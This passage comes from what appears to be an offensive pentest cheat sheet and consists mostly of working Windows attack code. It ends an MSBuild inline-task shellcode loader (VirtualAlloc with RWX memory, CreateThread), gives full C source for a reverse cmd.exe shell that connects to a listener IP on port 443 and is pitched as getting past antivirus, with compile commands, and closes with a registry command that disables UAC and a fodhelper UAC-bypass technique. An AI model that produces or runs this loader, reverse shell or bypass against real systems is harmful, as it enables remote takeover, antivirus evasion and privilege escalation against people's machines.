            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );
          public override bool Execute()
          {
            //PUT YOUR SHELLCODE HERE;

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```



### 4.3.9 Custom Windows TCP Reverse Shell

A custom reverse shell can often get past antivirus.

```c
/* Win32 TCP reverse cmd.exe shell
 * References:
 * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
 * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)
 */
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

// CHANGE THESE
#define TARGET_IP   "LISTEN_IP"
#define TARGET_PORT 443

void main(void) {
  SOCKET s;
  WSADATA wsa;
  STARTUPINFO si;
  struct sockaddr_in sa;
  PROCESS_INFORMATION pi;

  WSAStartup(MAKEWORD(2,2), &wsa);
  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(TARGET_IP);
  sa.sin_port = htons(TARGET_PORT);
  WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
  SecureZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = (HANDLE)s;
  si.hStdOutput = (HANDLE)s;
  si.hStdError = (HANDLE)s;
  CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}
```

To compile on Kali (as 32-bit binary because it works on both 32- and 64-bit):

```sh
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install mingw-w64 wine
i686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32
```



### 4.3.10 Windows UAC Bypass

Only the local "Administrator" user can perform admin actions without any User Account Control (UAC) restrictions. All other admin user accounts must normally pass UAC checks to perform admin actions, unless UAC is disabled.

UAC Enabled registry key (can only modify as admin):

``` powershell
# Disabling UAC via registry:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 0

# Enabling UAC:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 1
```

Bypass Technique:

```powershell
# Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
fodhelper

# To undo:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```





